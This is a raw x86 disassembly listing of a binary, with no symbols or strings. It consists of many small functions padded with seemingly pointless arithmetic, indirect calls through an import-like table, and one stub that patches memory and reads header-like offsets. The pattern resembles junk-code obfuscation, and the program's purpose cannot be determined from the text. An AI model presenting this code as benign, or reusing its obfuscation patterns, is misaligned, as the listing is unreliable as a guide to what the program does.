  4d07ad:	xor    eax,eax
  4d07af:	xor    ebx,ebx
  4d07b1:	push   DWORD PTR [ecx+ebx*1]
  4d07b4:	add    DWORD PTR [esp],edi
  4d07b7:	pop    DWORD PTR [esi+ebx*2]
  4d07ba:	dec    DWORD PTR [esi]
  4d07bc:	xor    edi,edi
  4d07be:	add    edi,DWORD PTR [ecx]
  4d07c0:	add    ecx,0x4
  4d07c3:	add    esi,0x4
  4d07c6:	add    eax,0x4
  4d07c9:	cmp    eax,0x6ac
  4d07ce:	jne    0x4d07af
  4d07d0:	push   edx
  4d07d1:	call   0x4d1280
  4d07d6:	add    esp,0x4
  4d07d9:	pop    edx
  4d07da:	add    esp,0x60
  4d07dd:	pop    ebp
  4d07de:	ret    
  4d07df:	add    BYTE PTR [edi-0x1],bl
  4d07e2:	adc    eax,0x4d204c
  4d07e7:	call   edi
  4d07e9:	add    BYTE PTR [eax],al
  4d07eb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d07f1:	sub    esp,0x40
  4d07f4:	mov    ecx,0x4d31b0
  4d07f9:	adc    DWORD PTR [ebp-0x1c],eax
  4d07fc:	push   ecx
  4d07fd:	push   edx
  4d07fe:	push   DWORD PTR [ecx+0xc0]
  4d0804:	push   ebx
  4d0805:	push   DWORD PTR [ecx+0x1a8]
  4d080b:	call   0x4d142c
  4d0810:	add    esp,0x10
  4d0813:	pop    ecx
  4d0814:	push   ecx
  4d0815:	push   0x0
  4d0817:	call   0x4d14c8
  4d081c:	add    esp,0x4
  4d081f:	pop    ecx
  4d0820:	push   ecx
  4d0821:	mov    ecx,0x0
  4d0826:	push   ecx
  4d0827:	call   0x4d1058
  4d082c:	add    esp,0x4
  4d082f:	pop    ecx
  4d0830:	add    esp,0x40
  4d0833:	pop    ebp
  4d0834:	ret    
  4d0835:	add    BYTE PTR [eax],al
  4d0837:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d083d:	sub    esp,0x40
  4d0840:	mov    edi,0x4d30ac
  4d0845:	mov    ebx,edi
  4d0847:	push   edi
  4d0848:	push   DWORD PTR [edi+0x13c]
  4d084e:	push   ecx
  4d084f:	push   ebx
  4d0850:	push   DWORD PTR [edi+0xdc]
  4d0856:	call   0x4d11e4
  4d085b:	add    esp,0x10
  4d085e:	pop    edi
  4d085f:	push   edi
  4d0860:	push   0x0
  4d0862:	call   0x4d1298
  4d0867:	add    esp,0x4
  4d086a:	pop    edi
  4d086b:	mov    edx,0x4d204c
  4d0870:	mov    edx,DWORD PTR [edx]
  4d0872:	push   edx
  4d0873:	push   DWORD PTR [edi+0x14c]
  4d0879:	pop    ebx
  4d087a:	call   ebx
  4d087c:	add    esp,0x40
  4d087f:	pop    ebp
  4d0880:	ret    
  4d0881:	add    BYTE PTR [eax],al
  4d0883:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0889:	sub    esp,0x4c
  4d088c:	lea    edi,ds:0x4d31c0
  4d0892:	and    DWORD PTR [ebp-0x18],edi
  4d0895:	push   edi
  4d0896:	push   ebx
  4d0897:	push   ebx
  4d0898:	push   edx
  4d0899:	call   0x4d1140
  4d089e:	add    esp,0xc
  4d08a1:	pop    edi
  4d08a2:	push   edi
  4d08a3:	call   0x4d1280
  4d08a8:	add    esp,0x4
  4d08ab:	pop    edi
  4d08ac:	push   edi
  4d08ad:	push   0x0
  4d08af:	call   0x4d13c4
  4d08b4:	add    esp,0x4
  4d08b7:	pop    edi
  4d08b8:	add    esp,0x4c
  4d08bb:	pop    ebp
  4d08bc:	ret    
  4d08bd:	add    BYTE PTR [eax],al
  4d08bf:	add    BYTE PTR [edi-0x1],bl
  4d08c2:	adc    eax,0x4d206c
  4d08c7:	call   edi
  4d08c9:	add    BYTE PTR [eax],al
  4d08cb:	add    BYTE PTR [edi-0x1],bl
  4d08ce:	adc    eax,0x4d2058
  4d08d3:	call   edi
  4d08d5:	add    BYTE PTR [eax],al
  4d08d7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d08dd:	sub    esp,0x54
  4d08e0:	lea    ebx,[edi+0xe8]
  4d08e6:	and    edi,0x2b
  4d08e9:	push   ebx
  4d08ea:	push   DWORD PTR [ebx+0x1e0]
  4d08f0:	push   DWORD PTR [ebx+0x80]
  4d08f6:	push   DWORD PTR [ebx+0x1cc]
  4d08fc:	push   DWORD PTR [ebx+0x48]
  4d08ff:	call   0x4d0c10
  4d0904:	add    esp,0x10
  4d0907:	pop    ebx
  4d0908:	call   0x4d1280
  4d090d:	add    esp,0x4
  4d0910:	mov    eax,0x0
  4d0915:	push   eax
  4d0916:	call   0x4d13c4
  4d091b:	add    esp,0x4
  4d091e:	add    esp,0x54
  4d0921:	pop    ebp
  4d0922:	ret    
  4d0923:	add    BYTE PTR [edi-0x1],bl
  4d0926:	adc    eax,0x4d2054
  4d092b:	call   edi
  4d092d:	add    BYTE PTR [eax],al
  4d092f:	add    BYTE PTR [edi-0x1],bl
  4d0932:	adc    eax,0x4d208c
  4d0937:	call   edi
  4d0939:	add    BYTE PTR [eax],al
  4d093b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0941:	sub    esp,0x58
  4d0944:	mov    ecx,0x4d3094
  4d0949:	xor    edx,ecx
  4d094b:	push   ecx
  4d094c:	push   edx
  4d094d:	push   DWORD PTR [ecx+0x110]
  4d0953:	push   DWORD PTR [ecx+0x14c]
  4d0959:	push   DWORD PTR [ecx+0x1c0]
  4d095f:	call   0x4d0704
  4d0964:	add    esp,0x10
  4d0967:	pop    ecx
  4d0968:	push   ecx
  4d0969:	lea    eax,[ecx-0x94]
  4d096f:	push   eax
  4d0970:	call   0x4d07e0
  4d0975:	add    esp,0x4
  4d0978:	test   eax,eax
  4d097a:	jne    0x4d0969
  4d097c:	pop    ecx
  4d097d:	push   ecx
  4d097e:	mov    edi,0x0
  4d0983:	push   edi
  4d0984:	call   0x4d1274
  4d0989:	add    esp,0x4
  4d098c:	pop    ecx
  4d098d:	add    esp,0x58
  4d0990:	pop    ebp
  4d0991:	ret    
  4d0992:	add    BYTE PTR [eax],al
  4d0994:	mov    edi,edi
  4d0996:	push   ebp
  4d0997:	mov    ebp,esp
  4d0999:	sub    esp,0x40
  4d099c:	lea    eax,ds:0x4d3068
  4d09a2:	adc    ebx,DWORD PTR [ebp-0xc]
  4d09a5:	push   eax
  4d09a6:	push   DWORD PTR [eax+0x5c]
  4d09a9:	push   ebx
  4d09aa:	push   ecx
  4d09ab:	call   0x4d0ad4
  4d09b0:	add    esp,0xc
  4d09b3:	pop    eax
  4d09b4:	push   eax
  4d09b5:	mov    ecx,0x0
  4d09ba:	push   ecx
  4d09bb:	call   0x4d11cc
  4d09c0:	add    esp,0x4
  4d09c3:	pop    eax
  4d09c4:	push   eax
  4d09c5:	mov    ecx,0x0
  4d09ca:	push   ecx
  4d09cb:	call   0x4d09dc
  4d09d0:	add    esp,0x4
  4d09d3:	pop    eax
  4d09d4:	add    esp,0x40
  4d09d7:	pop    ebp
  4d09d8:	ret    
  4d09d9:	add    BYTE PTR [eax],al
  4d09db:	add    BYTE PTR [edi-0x1],bl
  4d09de:	adc    eax,0x4d2030
  4d09e3:	call   edi
  4d09e5:	add    BYTE PTR [eax],al
  4d09e7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d09ed:	sub    esp,0x44
  4d09f0:	lea    ecx,[ebx+0x1c]
  4d09f3:	sub    DWORD PTR [ecx-0xf0],ecx
  4d09f9:	push   ecx
  4d09fa:	call   0x4d1064
  4d09ff:	add    esp,0x4
  4d0a02:	pop    ecx
  4d0a03:	push   ecx
  4d0a04:	push   DWORD PTR [ecx+0x6c]
  4d0a07:	push   DWORD PTR [ecx+0x1ec]
  4d0a0d:	push   eax
  4d0a0e:	call   0x4d10bc
  4d0a13:	add    esp,0xc
  4d0a16:	pop    ecx
  4d0a17:	push   ecx
  4d0a18:	lea    edi,[ecx-0x1f8]
  4d0a1e:	push   edi
  4d0a1f:	call   0x4d07e0
  4d0a24:	add    esp,0x4
  4d0a27:	test   eax,eax
  4d0a29:	jne    0x4d0a18
  4d0a2b:	pop    ecx
  4d0a2c:	add    esp,0x44
  4d0a2f:	pop    ebp
  4d0a30:	ret    
  4d0a31:	add    BYTE PTR [eax],al
  4d0a33:	add    BYTE PTR [edi-0x1],bl
  4d0a36:	adc    eax,0x4d2078
  4d0a3b:	call   edi
  4d0a3d:	add    BYTE PTR [eax],al
  4d0a3f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a45:	sub    esp,0x24
  4d0a48:	lea    edx,ds:0x4d303c
  4d0a4e:	or     eax,DWORD PTR [edx+0x1b4]
  4d0a54:	push   edx
  4d0a55:	push   esi
  4d0a56:	push   eax
  4d0a57:	call   0x4d0bc0
  4d0a5c:	add    esp,0x8
  4d0a5f:	pop    edx
  4d0a60:	push   edx
  4d0a61:	mov    eax,0x0
  4d0a66:	push   eax
  4d0a67:	call   0x4d09dc
  4d0a6c:	add    esp,0x4
  4d0a6f:	pop    edx
  4d0a70:	push   edx
  4d0a71:	mov    edx,0x0
  4d0a76:	push   edx
  4d0a77:	call   0x4d11cc
  4d0a7c:	add    esp,0x4
  4d0a7f:	pop    edx
  4d0a80:	add    esp,0x24
  4d0a83:	pop    ebp
  4d0a84:	ret    
  4d0a85:	add    BYTE PTR [eax],al
  4d0a87:	add    BYTE PTR [edi-0x1],bl
  4d0a8a:	adc    eax,0x4d2060
  4d0a8f:	call   edi
  4d0a91:	add    BYTE PTR [eax],al
  4d0a93:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0a99:	sub    esp,0x60
  4d0a9c:	lea    ebx,ds:0x4d31a4
  4d0aa2:	xor    edi,ecx
  4d0aa4:	push   ebx
  4d0aa5:	push   DWORD PTR [ebx+0x1ec]
  4d0aab:	push   DWORD PTR [ebx+0x120]
  4d0ab1:	push   ecx
  4d0ab2:	call   0x4d1014
  4d0ab7:	add    esp,0xc
  4d0aba:	pop    ebx
  4d0abb:	push   0x0
  4d0abd:	call   0x4d1058
  4d0ac2:	add    esp,0x4
  4d0ac5:	push   0x0
  4d0ac7:	call   0x4d08cc
  4d0acc:	add    esp,0x4
  4d0acf:	add    esp,0x60
  4d0ad2:	pop    ebp
  4d0ad3:	ret    
  4d0ad4:	mov    edi,edi
  4d0ad6:	push   ebp
  4d0ad7:	mov    ebp,esp
  4d0ad9:	sub    esp,0x40
  4d0adc:	lea    ebx,ds:0x4d31dc
  4d0ae2:	or     edi,DWORD PTR [ebx-0x134]
  4d0ae8:	mov    ecx,0x0
  4d0aed:	push   ecx
  4d0aee:	call   0x4d11cc
  4d0af3:	add    esp,0x4
  4d0af6:	push   ebx
  4d0af7:	push   DWORD PTR [ebx+0x74]
  4d0afa:	push   DWORD PTR [ebx+0xb4]
  4d0b00:	push   edx
  4d0b01:	call   0x4d09e8
  4d0b06:	add    esp,0xc
  4d0b09:	pop    ebx
  4d0b0a:	mov    esi,0x0
  4d0b0f:	push   esi
  4d0b10:	call   0x4d08cc
  4d0b15:	add    esp,0x4
  4d0b18:	add    esp,0x40
  4d0b1b:	pop    ebp
  4d0b1c:	ret    
  4d0b1d:	add    BYTE PTR [eax],al
  4d0b1f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b25:	sub    esp,0x60
  4d0b28:	lea    eax,ds:0x4d311c
  4d0b2e:	mov    esi,0xffffff9f
  4d0b33:	push   eax
  4d0b34:	mov    edx,0x0
  4d0b39:	push   edx
  4d0b3a:	call   0x4d08cc
  4d0b3f:	add    esp,0x4
  4d0b42:	pop    eax
  4d0b43:	push   eax
  4d0b44:	push   edi
  4d0b45:	push   edi
  4d0b46:	push   ecx
  4d0b47:	push   edx
  4d0b48:	call   0x4d0e24
  4d0b4d:	add    esp,0x10
  4d0b50:	pop    eax
  4d0b51:	push   eax
  4d0b52:	lea    edi,[eax-0x11c]
  4d0b58:	push   edi
  4d0b59:	call   0x4d07e0
  4d0b5e:	add    esp,0x4
  4d0b61:	test   eax,eax
  4d0b63:	jne    0x4d0b52
  4d0b65:	pop    eax
  4d0b66:	add    esp,0x60
  4d0b69:	pop    ebp
  4d0b6a:	ret    
  4d0b6b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0b71:	sub    esp,0x58
  4d0b74:	lea    ecx,[edi-0xb4]
  4d0b7a:	mov    DWORD PTR [ebp-0xc],0x7f0a
  4d0b81:	push   ecx
  4d0b82:	push   ebx
  4d0b83:	push   DWORD PTR [ecx+0x15c]
  4d0b89:	push   edx
  4d0b8a:	call   0x4d0d34
  4d0b8f:	add    esp,0xc
  4d0b92:	pop    ecx
  4d0b93:	push   ecx
  4d0b94:	mov    eax,0x0
  4d0b99:	push   eax
  4d0b9a:	call   0x4d11d8
  4d0b9f:	add    esp,0x4
  4d0ba2:	pop    ecx
  4d0ba3:	push   ecx
  4d0ba4:	call   0x4d1064
  4d0ba9:	add    esp,0x4
  4d0bac:	pop    ecx
  4d0bad:	add    esp,0x58
  4d0bb0:	pop    ebp
  4d0bb1:	ret    
  4d0bb2:	add    BYTE PTR [eax],al
  4d0bb4:	pop    edi
  4d0bb5:	call   DWORD PTR ds:0x4d209c
  4d0bbb:	call   edi
  4d0bbd:	add    BYTE PTR [eax],al
  4d0bbf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0bc5:	sub    esp,0x58
  4d0bc8:	mov    ebx,0x4d31d4
  4d0bcd:	mov    esi,0xffffff8e
  4d0bd2:	push   ebx
  4d0bd3:	push   DWORD PTR [ebx+0x148]
  4d0bd9:	push   esi
  4d0bda:	push   DWORD PTR [ebx+0x1b0]
  4d0be0:	call   0x4d074c
  4d0be5:	add    esp,0xc
  4d0be8:	pop    ebx
  4d0be9:	call   0x4d1540
  4d0bee:	add    esp,0x4
  4d0bf1:	mov    eax,0x0
  4d0bf6:	push   eax
  4d0bf7:	call   0x4d13c4
  4d0bfc:	add    esp,0x4
  4d0bff:	add    esp,0x58
  4d0c02:	pop    ebp
  4d0c03:	ret    
  4d0c04:	pop    edi
  4d0c05:	call   DWORD PTR ds:0x4d2018
  4d0c0b:	call   edi
  4d0c0d:	add    BYTE PTR [eax],al
  4d0c0f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c15:	sub    esp,0x34
  4d0c18:	mov    edi,0x4d31b0
  4d0c1d:	sub    DWORD PTR [edi-0xe4],0x74ec
  4d0c27:	push   edi
  4d0c28:	push   edx
  4d0c29:	push   edx
  4d0c2a:	push   esi
  4d0c2b:	call   0x4d0c54
  4d0c30:	add    esp,0xc
  4d0c33:	pop    edi
  4d0c34:	push   edi
  4d0c35:	mov    ebx,0x0
  4d0c3a:	push   ebx
  4d0c3b:	call   0x4d11cc
  4d0c40:	add    esp,0x4
  4d0c43:	pop    edi
  4d0c44:	push   edi
  4d0c45:	call   0x4d1064
  4d0c4a:	add    esp,0x4
  4d0c4d:	pop    edi
  4d0c4e:	add    esp,0x34
  4d0c51:	pop    ebp
  4d0c52:	ret    
  4d0c53:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0c59:	sub    esp,0x1c
  4d0c5c:	lea    edx,ds:0x4d30f4
  4d0c62:	cmp    edx,0x4942
  4d0c68:	je     0x4d0c57
  4d0c6a:	push   edx
  4d0c6b:	push   ebx
  4d0c6c:	push   edi
  4d0c6d:	call   0x4d1330
  4d0c72:	add    esp,0x8
  4d0c75:	pop    edx
  4d0c76:	push   edx
  4d0c77:	mov    esi,0x0
  4d0c7c:	push   esi
  4d0c7d:	call   0x4d11d8
  4d0c82:	add    esp,0x4
  4d0c85:	pop    edx
  4d0c86:	push   edx
  4d0c87:	call   0x4d1280
  4d0c8c:	add    esp,0x4
  4d0c8f:	pop    edx
  4d0c90:	add    esp,0x1c
  4d0c93:	pop    ebp
  4d0c94:	ret    
  4d0c95:	add    BYTE PTR [eax],al
  4d0c97:	add    BYTE PTR [edi-0x1],bl
  4d0c9a:	adc    eax,0x4d203c
  4d0c9f:	call   edi
  4d0ca1:	add    BYTE PTR [eax],al
  4d0ca3:	add    BYTE PTR [edi+0x2b],dl
  4d0ca6:	call   DWORD PTR [edi+0x57]
  4d0ca9:	push   edi
  4d0caa:	push   edi
  4d0cab:	call   0x4d1280
  4d0cb0:	sub    esp,0xfffffffc
  4d0cb3:	call   0x4d0f74
  4d0cb8:	push   0x2
  4d0cba:	xor    eax,eax
  4d0cbc:	dec    eax
  4d0cbd:	and    eax,0x4d3030
  4d0cc2:	push   0x0
  4d0cc4:	lea    ecx,[eax+0x6]
  4d0cc7:	add    BYTE PTR [ecx],0x41
  4d0cca:	push   eax
  4d0ccb:	call   0x4d154c
  4d0cd0:	pop    edi
  4d0cd1:	pop    edi
  4d0cd2:	pop    edi
  4d0cd3:	lea    edi,[eax+0x3b]
  4d0cd6:	mov    edi,DWORD PTR [edi]
  4d0cd8:	lea    eax,[eax+edi*1]
  4d0cdb:	mov    eax,DWORD PTR [eax+0x28]
  4d0cde:	pusha  
  4d0cdf:	mov    ah,0x45
  4d0ce1:	sub    al,ah
  4d0ce3:	ja     0x4d0838
  4d0ce9:	popa   
  4d0cea:	ret    
  4d0ceb:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0cf1:	sub    esp,0x5c
  4d0cf4:	mov    eax,0x4d3160
  4d0cf9:	sbb    ebx,ecx
  4d0cfb:	push   eax
  4d0cfc:	push   0x0
  4d0cfe:	call   0x4d1274
  4d0d03:	add    esp,0x4
  4d0d06:	pop    eax
  4d0d07:	push   eax
  4d0d08:	push   DWORD PTR [eax+0xf0]
  4d0d0e:	push   esi
  4d0d0f:	push   DWORD PTR [eax+0x24]
  4d0d12:	push   esi
  4d0d13:	call   0x4d0a94
  4d0d18:	add    esp,0x10
  4d0d1b:	pop    eax
  4d0d1c:	push   eax
  4d0d1d:	mov    edi,0x0
  4d0d22:	push   edi
  4d0d23:	call   0x4d11cc
  4d0d28:	add    esp,0x4
  4d0d2b:	pop    eax
  4d0d2c:	add    esp,0x5c
  4d0d2f:	pop    ebp
  4d0d30:	ret    
  4d0d31:	add    BYTE PTR [eax],al
  4d0d33:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0d39:	sub    esp,0x44
  4d0d3c:	mov    ebx,0x4d316c
  4d0d41:	xor    edi,DWORD PTR [ebx-0x128]
  4d0d47:	mov    edx,0x0
  4d0d4c:	push   edx
  4d0d4d:	call   0x4d13c4
  4d0d52:	add    esp,0x4
  4d0d55:	push   ebx
  4d0d56:	push   DWORD PTR [ebx+0x124]
  4d0d5c:	push   DWORD PTR [ebx+0x190]
  4d0d62:	call   0x4d0eec
  4d0d67:	add    esp,0x8
  4d0d6a:	pop    ebx
  4d0d6b:	push   0x0
  4d0d6d:	call   0x4d08cc
  4d0d72:	add    esp,0x4
  4d0d75:	add    esp,0x44
  4d0d78:	pop    ebp
  4d0d79:	ret    
  4d0d7a:	add    BYTE PTR [eax],al
  4d0d7c:	mov    edi,edi
  4d0d7e:	push   ebp
  4d0d7f:	mov    ebp,esp
  4d0d81:	sub    esp,0x48
  4d0d84:	lea    eax,[esi-0xe0]
  4d0d8a:	cmp    eax,0xe60
  4d0d8f:	je     0x4d0d7f
  4d0d91:	push   eax
  4d0d92:	call   0x4d1064
  4d0d97:	add    esp,0x4
  4d0d9a:	pop    eax
  4d0d9b:	push   eax
  4d0d9c:	push   DWORD PTR [eax+0xec]
  4d0da2:	push   DWORD PTR [eax+0x1c0]
  4d0da8:	push   DWORD PTR [eax+0xe4]
  4d0dae:	call   0x4d0f38
  4d0db3:	add    esp,0xc
  4d0db6:	pop    eax
  4d0db7:	push   eax
  4d0db8:	mov    esi,0x0
  4d0dbd:	push   esi
  4d0dbe:	call   0x4d11d8
  4d0dc3:	add    esp,0x4
  4d0dc6:	pop    eax
  4d0dc7:	add    esp,0x48
  4d0dca:	pop    ebp
  4d0dcb:	ret    
  4d0dcc:	pop    edi
  4d0dcd:	call   DWORD PTR ds:0x4d2098
  4d0dd3:	call   edi
  4d0dd5:	add    BYTE PTR [eax],al
  4d0dd7:	add    BYTE PTR [edi-0x1],bl
  4d0dda:	adc    eax,0x4d2088
  4d0ddf:	call   edi
  4d0de1:	add    BYTE PTR [eax],al
  4d0de3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0de9:	sub    esp,0x30
  4d0dec:	lea    ebx,ds:0x4d30dc
  4d0df2:	adc    eax,DWORD PTR [ebx+0x10]
  4d0df5:	mov    edx,0x0
  4d0dfa:	push   edx
  4d0dfb:	call   0x4d09dc
  4d0e00:	add    esp,0x4
  4d0e03:	push   ebx
  4d0e04:	push   edx
  4d0e05:	push   ecx
  4d0e06:	push   esi
  4d0e07:	push   edx
  4d0e08:	call   0x4d14d4
  4d0e0d:	add    esp,0x10
  4d0e10:	pop    ebx
  4d0e11:	mov    edi,0x0
  4d0e16:	push   edi
  4d0e17:	call   0x4d09dc
  4d0e1c:	add    esp,0x4
  4d0e1f:	add    esp,0x30
  4d0e22:	pop    ebp
  4d0e23:	ret    
  4d0e24:	mov    edi,edi
  4d0e26:	push   ebp
  4d0e27:	mov    ebp,esp
  4d0e29:	sub    esp,0x4c
  4d0e2c:	lea    edi,[eax-0x34]
  4d0e2f:	add    eax,DWORD PTR [edi+0x30]
  4d0e32:	push   edi
  4d0e33:	call   0x4d1280
  4d0e38:	add    esp,0x4
  4d0e3b:	pop    edi
  4d0e3c:	push   edi
  4d0e3d:	push   DWORD PTR [edi+0x54]
  4d0e40:	push   eax
  4d0e41:	push   DWORD PTR [edi+0x1f8]
  4d0e47:	push   edx
  4d0e48:	call   0x4d08d8
  4d0e4d:	add    esp,0x10
  4d0e50:	pop    edi
  4d0e51:	push   edi
  4d0e52:	push   0x0
  4d0e54:	call   0x4d11d8
  4d0e59:	add    esp,0x4
  4d0e5c:	pop    edi
  4d0e5d:	add    esp,0x4c
  4d0e60:	pop    ebp
  4d0e61:	ret    
  4d0e62:	add    BYTE PTR [eax],al
  4d0e64:	mov    edi,edi
  4d0e66:	push   ebp
  4d0e67:	mov    ebp,esp
  4d0e69:	sub    esp,0x50
  4d0e6c:	lea    esi,[edx+0x74]
  4d0e6f:	adc    DWORD PTR [esi+0x54],eax
  4d0e72:	mov    ebx,0x0
  4d0e77:	push   ebx
  4d0e78:	call   0x4d08cc
  4d0e7d:	add    esp,0x4
  4d0e80:	push   esi
  4d0e81:	push   edi
  4d0e82:	push   DWORD PTR [esi+0x70]
  4d0e85:	call   0x4d07ec
  4d0e8a:	add    esp,0x8
  4d0e8d:	pop    esi
  4d0e8e:	mov    edi,0x0
  4d0e93:	push   edi
  4d0e94:	call   0x4d1298
  4d0e99:	add    esp,0x4
  4d0e9c:	add    esp,0x50
  4d0e9f:	pop    ebp
  4d0ea0:	ret    
  4d0ea1:	add    BYTE PTR [eax],al
  4d0ea3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0ea9:	sub    esp,0x38
  4d0eac:	lea    edx,[edi-0x120]
  4d0eb2:	cmp    edx,0x2149
  4d0eb8:	jbe    0x4d0ea7
  4d0eba:	push   edx
  4d0ebb:	call   0x4d1540
  4d0ec0:	add    esp,0x4
  4d0ec3:	pop    edx
  4d0ec4:	push   edx
  4d0ec5:	push   DWORD PTR [edx+0x154]
  4d0ecb:	push   esi
  4d0ecc:	call   0x4d0e64
  4d0ed1:	add    esp,0x8
  4d0ed4:	pop    edx
  4d0ed5:	push   edx
  4d0ed6:	mov    esi,0x0
  4d0edb:	push   esi
  4d0edc:	call   0x4d11d8
  4d0ee1:	add    esp,0x4
  4d0ee4:	pop    edx
  4d0ee5:	add    esp,0x38
  4d0ee8:	pop    ebp
  4d0ee9:	ret    
  4d0eea:	add    BYTE PTR [eax],al
  4d0eec:	mov    edi,edi
  4d0eee:	push   ebp
  4d0eef:	mov    ebp,esp
  4d0ef1:	sub    esp,0x2c
  4d0ef4:	lea    ecx,[ebx+0x70]
  4d0ef7:	or     DWORD PTR [ecx-0x1bc],ebx
  4d0efd:	push   ecx
  4d0efe:	lea    edi,[ecx-0x1dc]
  4d0f04:	push   edi
  4d0f05:	call   0x4d07e0
  4d0f0a:	add    esp,0x4
  4d0f0d:	test   eax,eax
  4d0f0f:	jne    0x4d0efe
  4d0f11:	pop    ecx
  4d0f12:	push   ecx
  4d0f13:	push   DWORD PTR [ecx+0x3c]
  4d0f16:	push   edi
  4d0f17:	push   ebx
  4d0f18:	push   DWORD PTR [ecx+0xe0]
  4d0f1e:	call   0x4d12a4
  4d0f23:	add    esp,0x10
  4d0f26:	pop    ecx
  4d0f27:	push   ecx
  4d0f28:	call   0x4d1540
  4d0f2d:	add    esp,0x4
  4d0f30:	pop    ecx
  4d0f31:	add    esp,0x2c
  4d0f34:	pop    ebp
  4d0f35:	ret    
  4d0f36:	add    BYTE PTR [eax],al
  4d0f38:	mov    edi,edi
  4d0f3a:	push   ebp
  4d0f3b:	mov    ebp,esp
  4d0f3d:	sub    esp,0x24
  4d0f40:	lea    ecx,[eax-0x68]
  4d0f43:	adc    eax,ebx
  4d0f45:	push   ecx
  4d0f46:	push   0x0
  4d0f48:	call   0x4d1274
  4d0f4d:	add    esp,0x4
  4d0f50:	pop    ecx
  4d0f51:	push   ecx
  4d0f52:	push   DWORD PTR [ecx+0x150]
  4d0f58:	push   esi
  4d0f59:	call   0x4d1184
  4d0f5e:	add    esp,0x8
  4d0f61:	pop    ecx
  4d0f62:	push   ecx
  4d0f63:	call   0x4d1540
  4d0f68:	add    esp,0x4
  4d0f6b:	pop    ecx
  4d0f6c:	add    esp,0x24
  4d0f6f:	pop    ebp
  4d0f70:	ret    
  4d0f71:	add    BYTE PTR [eax],al
  4d0f73:	add    BYTE PTR [edi-0x1],bl
  4d0f76:	adc    eax,0x4d2008
  4d0f7b:	call   edi
  4d0f7d:	add    BYTE PTR [eax],al
  4d0f7f:	add    BYTE PTR [edi-0x1],bl
  4d0f82:	adc    eax,0x4d205c
  4d0f87:	call   edi
  4d0f89:	add    BYTE PTR [eax],al
  4d0f8b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0f91:	sub    esp,0x34
  4d0f94:	lea    esi,[eax-0x144]
  4d0f9a:	sub    DWORD PTR [esi+0x128],edx
  4d0fa0:	push   esi
  4d0fa1:	push   eax
  4d0fa2:	push   DWORD PTR [esi+0xe8]
  4d0fa8:	push   DWORD PTR [esi+0x1e8]
  4d0fae:	push   edi
  4d0faf:	call   0x4d0b20
  4d0fb4:	add    esp,0x10
  4d0fb7:	pop    esi
  4d0fb8:	push   0x0
  4d0fba:	call   0x4d09dc
  4d0fbf:	add    esp,0x4
  4d0fc2:	call   0x4d1540
  4d0fc7:	add    esp,0x4
  4d0fca:	add    esp,0x34
  4d0fcd:	pop    ebp
  4d0fce:	ret    
  4d0fcf:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d0fd5:	sub    esp,0x48
  4d0fd8:	mov    eax,0x4d3078
  4d0fdd:	sub    DWORD PTR [eax+0x78],edx
  4d0fe0:	push   eax
  4d0fe1:	push   0x0
  4d0fe3:	call   0x4d1274
  4d0fe8:	add    esp,0x4
  4d0feb:	pop    eax
  4d0fec:	push   eax
  4d0fed:	push   ecx
  4d0fee:	push   edx
  4d0fef:	call   0x4d0884
  4d0ff4:	add    esp,0x8
  4d0ff7:	pop    eax
  4d0ff8:	push   eax
  4d0ff9:	call   0x4d1280
  4d0ffe:	add    esp,0x4
  4d1001:	pop    eax
  4d1002:	add    esp,0x48
  4d1005:	pop    ebp
  4d1006:	ret    
  4d1007:	add    BYTE PTR [edi-0x1],bl
  4d100a:	adc    eax,0x4d20a0
  4d100f:	call   edi
  4d1011:	add    BYTE PTR [eax],al
  4d1013:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1019:	sub    esp,0x2c
  4d101c:	lea    edi,[ebx-0x104]
  4d1022:	sub    eax,ecx
  4d1024:	push   edi
  4d1025:	mov    esi,0x0
  4d102a:	push   esi
  4d102b:	call   0x4d08cc
  4d1030:	add    esp,0x4
  4d1033:	pop    edi
  4d1034:	push   edi
  4d1035:	push   DWORD PTR [edi+0x150]
  4d103b:	push   eax
  4d103c:	call   0x4d093c
  4d1041:	add    esp,0x8
  4d1044:	pop    edi
  4d1045:	push   edi
  4d1046:	push   0x0
  4d1048:	call   0x4d11d8
  4d104d:	add    esp,0x4
  4d1050:	pop    edi
  4d1051:	add    esp,0x2c
  4d1054:	pop    ebp
  4d1055:	ret    
  4d1056:	add    BYTE PTR [eax],al
  4d1058:	pop    edi
  4d1059:	call   DWORD PTR ds:0x4d2000
  4d105f:	call   edi
  4d1061:	add    BYTE PTR [eax],al
  4d1063:	add    BYTE PTR [edi-0x1],bl
  4d1066:	adc    eax,0x4d2048
  4d106b:	call   edi
  4d106d:	add    BYTE PTR [eax],al
  4d106f:	add    BYTE PTR [edi-0x1],bl
  4d1072:	adc    eax,0x4d2080
  4d1077:	call   edi
  4d1079:	add    BYTE PTR [eax],al
  4d107b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1081:	sub    esp,0x38
  4d1084:	lea    eax,ds:0x4d3184
  4d108a:	mov    ebx,DWORD PTR [eax-0x130]
  4d1090:	push   eax
  4d1091:	push   0x0
  4d1093:	call   0x4d14c8
  4d1098:	add    esp,0x4
  4d109b:	pop    eax
  4d109c:	push   eax
  4d109d:	push   ebx
  4d109e:	push   ecx
  4d109f:	push   edi
  4d10a0:	push   ebx
  4d10a1:	call   0x4d0a40
  4d10a6:	add    esp,0x10
  4d10a9:	pop    eax
  4d10aa:	push   eax
  4d10ab:	call   0x4d1540
  4d10b0:	add    esp,0x4
  4d10b3:	pop    eax
  4d10b4:	add    esp,0x38
  4d10b7:	pop    ebp
  4d10b8:	ret    
  4d10b9:	add    BYTE PTR [eax],al
